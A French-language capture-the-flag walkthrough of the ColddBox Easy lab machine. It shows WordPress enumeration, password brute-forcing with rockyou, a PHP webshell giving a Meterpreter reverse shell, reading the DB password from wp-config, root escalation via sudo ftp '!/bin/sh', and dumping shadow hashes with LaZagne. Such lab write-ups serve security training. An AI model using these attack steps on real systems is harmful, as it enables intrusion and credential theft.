\# ColddBoxEasy_IV

<span style="color: #dddddd;">👁️</span> Massap

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.253
[i] Rate: 1000
 
🔥 Masscan 192.168.56.253...100%
👁️ Nmap 192.168.56.253...100%
 
[+] 80/tcp open
[+] 4512/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.253-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> **Gobuster**

```
┌──[m0rph3u5@parrot]─[~/Massap]
└──╼ $gobuster dir -u http://192.168.56.253 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt,zip,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.253
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 317] [--> http://192.168.56.253/hidden/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.56.253/]
/license.txt          (Status: 200) [Size: 19930]
/readme.html          (Status: 200) [Size: 7173]
/server-status        (Status: 403) [Size: 279]
/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.56.253/wp-admin/]
/wp-content           (Status: 301) [Size: 321] [--> http://192.168.56.253/wp-content/]
/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.56.253/wp-includes/]
/wp-config.php        (Status: 200) [Size: 0]
/wp-login.php         (Status: 200) [Size: 2547]
/wp-trackback.php     (Status: 200) [Size: 135]
Progress: 143283 / 143290 (100.00%)
/xmlrpc.php           (Status: 200) [Size: 42]
===============================================================
Finished
===============================================================
```

&nbsp;

**<span style="color: #dddddd;">💯</span> WPScan**

Énumération des utilisateur de `wordpress`

```
┌─[m0rph3u5@parrot]─[~/Massap]
└──╼ $wpscan --url http://192.168.56.253 -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.56.253/ [192.168.56.253]
[+] Started: Fri Sep 26 17:30:57 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.253/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.253/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.253/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.253/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.56.253/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.56.253/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.56.253/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://192.168.56.253/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.253/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Sep 26 17:31:02 2025
[+] Requests Done: 68
[+] Cached Requests: 6
[+] Data Sent: 16.159 KB
[+] Data Received: 14.141 MB
[+] Memory used: 185.496 MB
[+] Elapsed time: 00:00:04
```

&nbsp;

Crack du mot de passe de `c0ldd`

```
┌──[m0rph3u5@parrot]─[~/Massap]
└──╼ $wpscan --url http://192.168.56.253 -U c0ldd --passwords $HOME/Desktop/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.253/ [192.168.56.253]
[+] Started: Fri Sep 26 17:33:00 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.253/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.253/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.253/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.253/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://192.168.56.253/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.56.253/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.56.253/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://192.168.56.253/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.253/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                                                                                                
Trying c0ldd / 9876543210 Time: 00:00:19 <                                                                                                           > (1230 / 14345628)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Sep 26 17:33:34 2025
[+] Requests Done: 1371
[+] Cached Requests: 36
[+] Data Sent: 447.532 KB
[+] Data Received: 4.532 MB
[+] Memory used: 295.078 MB
[+] Elapsed time: 00:00:33
```

&nbsp;

**<span style="color: #dddddd;">💥</span> Metasploit - webshell**

Via l’interface de `wordpress` j’ai insérer du code `php` dans le code source de la page `index.php` une webshell

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.149:4444 
[*] Sending stage (40004 bytes) to 192.168.56.253
[*] Meterpreter session 1 opened (192.168.56.149:4444 -> 192.168.56.253:40296) at 2025-09-26 17:45:25 +0200

(Meterpreter 1)(/var/www/html) >
```

&nbsp;

🛰️ **fullEx**

Mot de passe trouver dans le code php wordpress

```
www-data@ColddBox-Easy:/tmp/fullEx$ bash fullEx.sh -perm
www-data@ColddBox-Easy:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3056 Oct 14  2020 /var/www/html/wp-config.php
define('DB_NAME', 'colddbox');
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
define('DB_HOST', 'localhost');
```

&nbsp;

S’authentifiant avec l’utilisateur `c0ldd`

```
www-data@ColddBox-Easy:/tmp/fullEx$ su - c0ldd
su - c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:~$

```

&nbsp;

Élévation de privilège

```
c0ldd@ColddBox-Easy:~$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:~$
```

&nbsp;

&nbsp;<span style="color: #dddddd;">#️⃣</span> **GTFobin - ftp**

https://gtfobins.github.io/gtfobins/ftp/#sudo

```
c0ldd@ColddBox-Easy:~$ sudo ftp
!/bin/sh
ftp> 
!/bin/sh
# id
id
uid=0(root) gid=0(root) grupos=0(root)
```

&nbsp;

🛰️ **fullEx**

Recherche d’identifiant sur la machine

```
root@ColddBox-Easy:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: root
Hash: $6$AmnS9Mmu$ksCvZKfMuPg42PahTg4fOI4Iy1I.mFzffaw29yLh.2VxBV5XxvWvvy01NE5TsRcJHQ.MHDEIksgW5W7b5YEvl1:18529:0:99999:7:::

[+] Hash found !!!
Login: c0ldd
Hash: $6$AnciUfDx$Y9lDZThc6/Q/rWMajprHD54ynCLBmy8swBujZO.CG6b7j7YZiR/RIrdhzn2euH1A9r2jJE2U0bbLarUFdwSI40:18529:0:99999:7:::


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.04338550567626953
```

&nbsp;

Identifiant trouver

| User | password |
| --- | --- |
| c0ldd | cybersecurity |